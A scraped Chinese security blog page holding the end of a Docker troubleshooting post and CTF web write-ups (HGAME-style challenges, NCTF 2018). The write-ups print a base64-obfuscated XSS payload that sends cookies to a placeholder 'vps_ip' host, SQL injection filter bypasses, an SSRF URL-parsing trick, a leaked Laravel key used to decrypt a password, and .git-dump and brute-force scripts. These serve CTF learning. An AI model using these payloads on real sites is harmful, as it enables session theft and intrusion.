<h2 id="遇到的某些问题"><a href="#遇到的某些问题" class="headerlink" title="遇到的某些问题"></a>遇到的某些问题</h2><h3 id="如果是在centos环境下，遇到的各种问题，建议之间换成ubuntu。"><a href="#如果是在centos环境下，遇到的各种问题，建议之间换成ubuntu。" class="headerlink" title="如果是在centos环境下，遇到的各种问题，建议之间换成ubuntu。"></a>如果是在centos环境下，遇到的各种问题，建议之间换成ubuntu。</h3><h3 id="特别注意，ubuntu版本号一定要对上，ubuntu-16-04不出问题，但是ubuntu-18-04一堆问题。在安装前一定要确认自己的版本号"><a href="#特别注意，ubuntu版本号一定要对上，ubuntu-16-04不出问题，但是ubuntu-18-04一堆问题。在安装前一定要确认自己的版本号" class="headerlink" title="特别注意，ubuntu版本号一定要对上，ubuntu:16.04不出问题，但是ubuntu:18.04一堆问题。在安装前一定要确认自己的版本号"></a>特别注意，ubuntu版本号一定要对上，ubuntu:16.04不出问题，但是ubuntu:18.04一堆问题。在安装前一定要确认自己的版本号</h3><h3 id="在建立新容器时碰到如下错误"><a href="#在建立新容器时碰到如下错误" class="headerlink" title="在建立新容器时碰到如下错误"></a>在建立新容器时碰到如下错误</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error response from daemon: Conflict. The container name &quot;/test1&quot; is already in use by container &quot;d197fb61f61c1d1d7b605a49d3be658f9fa10f581bd02ff9574f8a39a62a716e&quot;. You have to remove (or rename) that container to be able to reuse that name.</span><br><span class="line">See &apos;docker run --help&apos;.</span><br></pre></td></tr></table></figure>
<p>这是因为该名称的容器已存在，查看所有的容器把该名字容器删除即可，删除命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm test1</span><br></pre></td></tr></table></figure>
<p>如果是运行的容器，rm后面加个-f参数</p>
<h3 id="进入docker安装apache时遇到的问题"><a href="#进入docker安装apache时遇到的问题" class="headerlink" title="进入docker安装apache时遇到的问题"></a>进入docker安装apache时遇到的问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E: Unable to locate package apache2</span><br></pre></td></tr></table></figure>
<p>需要更新apt，命令如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
<h3 id="重启失败的时候查看下服务状态，未启动时无法重启"><a href="#重启失败的时候查看下服务状态，未启动时无法重启" class="headerlink" title="重启失败的时候查看下服务状态，未启动时无法重启"></a>重启失败的时候查看下服务状态，未启动时无法重启</h3><h3 id="碰到-‘xxx’-command-not-find"><a href="#碰到-‘xxx’-command-not-find" class="headerlink" title="碰到 ‘xxx’ command not find"></a>碰到 ‘xxx’ command not find</h3><p>缺什么安装什么</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install xxx</span><br></pre></td></tr></table></figure>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/xiaogugood/article/details/18400669" target="_blank" rel="noopener">Linux新手入门：Unable to locate package错误解决办法</a><br><a href="https://legacy.gitbook.com/book/yeasy/docker_practice/details" target="_blank" rel="noopener">Docker 从入门到实践</a><br><a href="https://www.cnblogs.com/youcong/p/9309197.html" target="_blank" rel="noopener">ubuntu16.04安装wordpress</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/03/07/记录搭建docker时踩的一些列坑/" data-id="cjv4r4rzw002fmcvjg2euqzo2" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/踩坑记录/">踩坑记录</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-近期比赛题目复现" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/02/25/近期比赛题目复现/" class="article-date">
  <time class="post-time" datetime="2019-02-25T10:54:47.000Z" itemprop="datePublished">
    <span class="post-month">2月</span><br>
    <span class="post-day">25</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/02/25/近期比赛题目复现/">近期比赛题目复现</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整个寒假都在学习挖洞相关的知识，ctf方面的投入比之前少了许多，近期比赛优秀的题目也比较多，所以写了这篇复现来记录一些新知识</p>
<h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><p>得到flag需要满足多个条件，前面多个条件都是ctf常见的，这里就不多叙述了，这题最主要的一个绕过点如下:</p>
<p><img src="/images/23/1.png" alt=""><br>先审计代码，第九步要求parse_url()解析url的域名要为百度的域名，第十步则是限制了协议要为http，所有限制过后，网站会对我们输入的url进行访问，后面明显看出可以利用ssrf读取admin.php，所以现在的矛盾在于如何使得curl解析的域名是本地的域名同时绕过第九步的限制。<br>这里就需要理解curl和parse_url对url域名解析的差异性了。在如下这个url中:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test@1.com@2.com</span><br></pre></td></tr></table></figure></p>
<p>curl解析的域名为1.com，而parse_url却是解析为2.com，还有类似的函数也是这样解析，如图:<br><img src="/images/23/2.png" alt=""><br>构造如上payload就能绕过了。</p>
<h2 id="HappyXss"><a href="#HappyXss" class="headerlink" title="HappyXss"></a>HappyXss</h2><p>这题目比较上一题，把script，href，onerror等等关键字都过滤了，而且无法加载远程src资源。<br>这里学到了一种新的思路，在前端中eval()函数并没有被过滤，因此我们可以利用它把我们传入的代码转换成xss的payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(atob(base64后的代码));   //eval(atob(&quot;YWxlcnQoMSk=&quot;));</span><br><span class="line">eval(String.fromCharCode(ascii码));    //eval(String.fromCharCode(97,108,101,114,116,40,49,41));</span><br></pre></td></tr></table></figure></p>
<p>我们只需要让它带上cookie访问我们的服务器即可，因此payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href=&quot;http://vps_ip/&quot;+document.cookie</span><br></pre></td></tr></table></figure></p>
<p>注意的是””被过滤了，可以选择使用’’，最终payload如下，监听端口查看cookie就行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=javascript:eval(atob(&apos;d2luZG93LmxvY2F0aW9uLmhyZWY9Imh0dHA6Ly92cHNfaXAvIitkb2N1bWVudC5jb29raWU=&apos;)); autofocus&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="HappyPHP"><a href="#HappyPHP" class="headerlink" title="HappyPHP"></a>HappyPHP</h2><p>这题目主要考察代码审计，登入界面有个提示可以拿到源码。<br>题目框架为laravel，根据大师傅的wp，学到了分析源码的基本步骤。<br>首先从路由开始，也就是/routes/web.app，可以分析出该网站有多少个页面，分别是什么功能。<br>接着从第一条开始，逐条追踪，查看详细代码的构成，一步一步审计直到找到可利用点。必要时可以使用全局搜索找我们所要的关键信息。<br>分析如何利用，构造payload，达到所要的目的。<br>在SessionsController.php发现可利用的点:<br><img src="/images/23/3.png" alt=""><br>这里代码可以进行注入，并且它会把结果返回给我们。联想到题目提示，flag在admin下，我们可以想到利用注入把email和password给注入出来。可以在/database/factories/UserFactory.php看到列的参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email:admin@hgame.com</span><br><span class="line">password:eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==</span><br></pre></td></tr></table></figure></p>
<p>对password进行base64解码得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;iv&quot;:&quot;rnVrqfCvfJgnvSTi9z7KLw==&quot;,&quot;value&quot;:&quot;EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=&quot;,&quot;mac&quot;:&quot;56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>继续通过全局搜索key，cipher来找到加密方式，发现在app.php中:<br><img src="/images/23/4.png" alt=""><br>全局搜索APP_KEY并没有搜索到，发现.env文件并不存在，所以回溯到github项目上找到被删除的.env文件:<br><img src="/images/23/5.png" alt=""><br>找到了我们所要的APP_KEY:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$key=&quot;9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=&quot;;</span><br></pre></td></tr></table></figure></p>
<p>结合上面的iv值和value值就可以解密被加密前的密码，登入即可拿到flag。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/02/25/近期比赛题目复现/" data-id="cjv4r4s02002omcvjmxgzt1q4" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛总结/">比赛总结</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-NCTF-Web-wp" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/28/NCTF-Web-wp/" class="article-date">
  <time class="post-time" datetime="2018-11-28T13:13:28.000Z" itemprop="datePublished">
    <span class="post-month">11月</span><br>
    <span class="post-day">28</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/28/NCTF-Web-wp/">NCTF Web wp</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/赛后wp/">赛后wp</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期刚刚打完NCTF，成绩还算理想，虽然我们打了校内第二，总榜第七，但是赛后发现了很多问题，借此复盘一下这次的比赛。(Web题12道只做出了七道题目，赛后做了一道，实力还是欠缺一点)</p>
<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>抓包，得到flag.</p>
<h2 id="滴！晨跑打卡"><a href="#滴！晨跑打卡" class="headerlink" title="滴！晨跑打卡"></a>滴！晨跑打卡</h2><p>很明显这是一道注入题，抓包爆破测试一下过滤的字符发现空格，–，#，*等被过滤了，使用连接词测试一下语句构成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;or&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
<p>发现正常回显，可以判断大概是’ $_POST[\’XXX\’] ‘这种类型，空格可以使用%0b绕过，注释被过滤我们只要拼接语句让其正常查询不报错就行了，所以大致可以构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;union%0bselect%0b1,2,3%0b&apos;</span><br></pre></td></tr></table></figure></p>
<p>可以看到回显位：<br><img src="/images/22/1.png" alt=""><br>接着按照套路查询就行了，最后一步注意要标记是哪个数据库：<br><img src="/images/22/2.png" alt=""><br>得到flag.</p>
<h2 id="Go-Lakers"><a href="#Go-Lakers" class="headerlink" title="Go Lakers"></a>Go Lakers</h2><p>这题一开始套路和签到题一样，得抓包，拉到最下面发现这样一句话：<br><img src="/images/22/3.png" alt=""><br>按照要求post viewsource=1得到源码：<br><img src="/images/22/4.png" alt=""><br>这里我当时做的时候掉进陷阱了，我以为要绕过所有的条件才能利用file_get_contents()得到源码，这里只用传入加密后的file_参数就能输出源码了，这里分享绕过的方式吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if(!(getip() === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;9527&apos;]) === &apos;nctf_is_good&apos; &amp;&amp; mt_rand(1,10000) === intval($_GET[&apos;go_Lakers&apos;])))&#123;</span><br><span class="line">    header(&apos;location:https://bbs.hupu.com/24483652.html?share_from=kqapp&apos;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &apos;great&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>第一个条件可以使用XFF: 127.0.0.1来绕过，但是会有个提示:<br><img src="/images/22/5.png" alt=""><br>使用Client-IP就行了，第二个使用php://input协议传入字符就行，第三个我们可以使用多线程爆破，毕竟只有10000个数据。接下来就是加密函数了，按照解密函数写就行了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function en_code($value)&#123;</span><br><span class="line">    $result = &apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;strlen($value);$i++)&#123;</span><br><span class="line">        $result .= chr(ord($value[$i])+$i*2);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>直接读flag.php就能得到flag.</p>
<h2 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h2><p>题目就给了一个很直接的提示，猜测应该是.git泄露，测试果然发现没错:<br><img src="/images/22/6.png" alt=""><br>使用Githack脚本跑一下只能跑出一个README.md，打开发现了这样一句话:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Allsource files are in git tag1.0</span><br></pre></td></tr></table></figure></p>
<p>emmm，这就能联想这一篇文章：<a href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html</a><br>题目思路也很简单，就是让我们提取出源码就能得到flag了，具体原理可以看上面离别歌大师傅这篇文章，这里不讲太详细。<br>首先我们访问commit的一个“链接”:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20003/.git/refs/tags/1.0</span><br></pre></td></tr></table></figure></p>
<p>得到一串字符串，按照.git文件生成原理，我们访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20003/.git/objects/01/b878ee5f39810a02f06b4a560571413020ea42</span><br></pre></td></tr></table></figure></p>
<p>得到一个文件，通过对这个文件进行zlib解压发现了这个文件指向了两个文件:<br><img src="/images/22/7.png" alt=""><br>emmm，这里说下原理，我们就根据这两个字符串，按照刚刚的方法得到下一个文件，zlib解压，对文件的头进行判断，重复过程最终得到最初的文件，最后下载的文件我们没办法zlib解压，可以通过git cat-file xxxxx得到最终文件。这里贴个离别歌改过的脚本，我写了个注释有利于标识该改哪里:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line">import zlib</span><br><span class="line">import re</span><br><span class="line">import Queue</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0)&quot;</span><br><span class="line">        &quot; Gecko/20100101 Firefox/46.0&quot;</span><br><span class="line">&#125;#改头</span><br><span class="line">target = &quot;http://ctfgame.acdxvfsvd.net:20003/.git/&quot;  #地址</span><br><span class="line">output_folder = &quot;./n1ctf/&quot;   #储存文件的目录</span><br><span class="line"></span><br><span class="line">class GitDdatabase(object):</span><br><span class="line">    def __init__(self, data):</span><br><span class="line">        self.data = data</span><br><span class="line">        self.pos = 0</span><br><span class="line"></span><br><span class="line">    def read_to_next_char(self, char=&quot; &quot;):</span><br><span class="line">        pos = self.data.index(char, self.pos)</span><br><span class="line">        ret = self.read_exact(pos)</span><br><span class="line">        self.pos += 1</span><br><span class="line">        return ret</span><br><span class="line"></span><br><span class="line">    def read_exact(self, size):</span><br><span class="line">        ret = self.data[self.pos:size]</span><br><span class="line">        self.pos = size</span><br><span class="line">        return ret</span><br><span class="line"></span><br><span class="line">    def read_blob(self):</span><br><span class="line">        return re.sub(&apos;^blob \d+?\00&apos;, &apos;&apos;, self.data)</span><br><span class="line"></span><br><span class="line">    def read_tree(self):</span><br><span class="line">        mode = self.read_to_next_char(&quot; &quot;)</span><br><span class="line">        filename = self.read_to_next_char(&quot;\x00&quot;)</span><br><span class="line">        sha1 = self.read_exact(self.pos + 20)</span><br><span class="line">        return mode, filename, sha1</span><br><span class="line"></span><br><span class="line">    def get_db_type(self):</span><br><span class="line">        file_sort = self.read_to_next_char(&quot; &quot;)</span><br><span class="line">        file_size = self.read_to_next_char(&quot;\x00&quot;)</span><br><span class="line">        file_size = int(file_size)</span><br><span class="line">        return file_sort, file_size</span><br><span class="line"></span><br><span class="line">def request_object(id):</span><br><span class="line">    global target</span><br><span class="line">    folder = &apos;objects/%s/&apos; % id[:2]</span><br><span class="line">    response = requests.get(target + folder + id[2:])</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return zlib.decompress(response.content)</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    response = requests.get(target + &quot;refs/tags/1.0&quot;, headers=headers)</span><br><span class="line">    if response.status_code == 404:</span><br><span class="line">        print(&quot;No this tag&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    data = response.content</span><br><span class="line">    commit_id = data.strip()</span><br><span class="line"></span><br><span class="line">    next_id = commit_id   ##可以更改要找的目录的值，即可查找出其目录下的源码</span><br><span class="line">    print next_id</span><br><span class="line">    data = request_object(next_id)</span><br><span class="line">    if not data:</span><br><span class="line">        print(&quot;No this commit id&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    rex = re.search(ur&quot;commit .*?([a-f0-9]&#123;40&#125;)&quot;, data)</span><br><span class="line">    next_id = rex.group(1)</span><br><span class="line">    data = request_object(next_id)</span><br><span class="line">    if not data:</span><br><span class="line">        print(&quot;No this commit id&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    tasks = Queue.Queue()</span><br><span class="line">    gd = GitDdatabase(data)</span><br><span class="line">    file_sort, file_size = gd.get_db_type()</span><br><span class="line">    while 1:</span><br><span class="line">        try:</span><br><span class="line">            (mode, filename, sha1) = gd.read_tree()</span><br><span class="line">            basedir = &quot;./&quot;</span><br><span class="line">            tasks.put((mode, filename, sha1, basedir))</span><br><span class="line">        except ValueError as e:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    while 1:</span><br><span class="line">        if tasks.empty():</span><br><span class="line">            break</span><br><span class="line">        (mode, filename, sha1, basedir) = tasks.get()</span><br><span class="line">        sha1 = binascii.b2a_hex(sha1)</span><br><span class="line">        data = request_object(sha1)</span><br><span class="line">        if not data:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        gd = GitDdatabase(data)</span><br><span class="line">        file_sort, file_size = gd.get_db_type()</span><br><span class="line">        if file_sort == &quot;tree&quot;:</span><br><span class="line">            basedir = os.path.join(basedir, filename)</span><br><span class="line">            while 1:</span><br><span class="line">                try:</span><br><span class="line">                    (mode, filename, sha1) = gd.read_tree()</span><br><span class="line">                    tasks.put((mode, filename, sha1, basedir))</span><br><span class="line">                except ValueError as e:</span><br><span class="line">                    break</span><br><span class="line">        elif file_sort == &quot;blob&quot;:</span><br><span class="line">            data = gd.read_blob()</span><br><span class="line">            folder = os.path.join(output_folder, basedir)</span><br><span class="line">            if not os.path.exists(folder):</span><br><span class="line">                os.makedirs(folder)</span><br><span class="line">            filename = os.path.join(folder, filename)</span><br><span class="line">            with open(filename, &quot;wb&quot;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">            print(&quot;[+] Write &#123;filename&#125; success&quot;.format(filename=filename))</span><br></pre></td></tr></table></figure></p>
<p>最后可以得到两个flag,一真一假自己尝试。</p>
<h2 id="小绿草之最强大脑"><a href="#小绿草之最强大脑" class="headerlink" title="小绿草之最强大脑"></a>小绿草之最强大脑</h2><p>这个单纯就是考脚本能力了，题目有个提示：告诉我们有源码泄露，访问index.php.bak得到源码：<br><img src="/images/22/8.png" alt=""><br>里面关键点就在于<strong>intval()</strong>这个函数，这个函数在处理太过于大的数字的时候会出现漏洞，虽然说可以防止整数溢出漏洞，但是通过这样计算出的值就会出现bug。<br>通过本地测试，测试出在数字足够大时，intval()一直为2147483647，如图:<br><img src="/images/22/9.png" alt=""><br>但是在服务器上测试值却为9223372036854775807:<br><img src="/images/22/10.png" alt=""><br>最后测试也是9223372036854775807没错，所以脚本如下(记得使用session,以及time.sleep函数):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def cal(str):  #传入抓取的源码</span><br><span class="line">    pstr = &apos;&lt;div style=&quot;display:inline;&quot;&gt;&apos;</span><br><span class="line">    jstr = &apos; &lt;/div&gt;&lt;div style=&quot;display:inline;&quot;&gt;&apos;</span><br><span class="line">    num = len(jstr)</span><br><span class="line">    index = str.index(pstr) + len(pstr)</span><br><span class="line">    calstr = &quot;&quot;</span><br><span class="line">    for i in range(0, 71):</span><br><span class="line">        calnum = index + i * num</span><br><span class="line">        calstr = calstr + str[calnum]</span><br><span class="line">    if &quot;=&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;=&quot;, &quot;&quot;)</span><br><span class="line">    if &quot;e&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;e&quot;, &quot;&quot;)</span><br><span class="line">    if &quot;v&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;v&quot;, &quot;&quot;)</span><br><span class="line">    print calstr</span><br><span class="line">    return eval(calstr)</span><br><span class="line">def test(str):  #传入抓取的源码</span><br><span class="line">    pstr = &apos;&lt;div style=&quot;display:inline;&quot;&gt;&apos;</span><br><span class="line">    jstr = &apos; &lt;/div&gt;&lt;div style=&quot;display:inline;&quot;&gt;&apos;</span><br><span class="line">    num = len(jstr)</span><br><span class="line">    index = str.index(pstr) + len(pstr)</span><br><span class="line">    calstr = &quot;&quot;</span><br><span class="line">    for i in range(0, 71):</span><br><span class="line">        calnum = index + i * num</span><br><span class="line">        calstr = calstr + str[calnum]</span><br><span class="line">    if &quot;=&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;=&quot;, &quot;&quot;)</span><br><span class="line">    if &quot;e&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;e&quot;, &quot;&quot;)</span><br><span class="line">    if &quot;v&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;v&quot;, &quot;&quot;)</span><br><span class="line">    print calstr</span><br><span class="line">url = &quot;http://ctfgame.acdxvfsvd.net:20004/&quot;</span><br><span class="line">s = requests.session()</span><br><span class="line">re = s.get(url)</span><br><span class="line">content = re.content</span><br><span class="line">count = cal(content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count + 9223372036854775807&#125;)</span><br><span class="line">count1 = cal(res.content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res1 = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count1 + 9223372036854775807&#125;)</span><br><span class="line">count2 = cal(res1.content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res2 = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count2 + 9223372036854775807&#125;)</span><br><span class="line">count3 = cal(res2.content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res3 = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count3 + 9223372036854775807&#125;)</span><br><span class="line">count4 = cal(res3.content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res4 = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count4 + 9223372036854775807&#125;)</span><br><span class="line">print res4.content</span><br></pre></td></tr></table></figure></p>
<p>五次之后得到flag.</p>
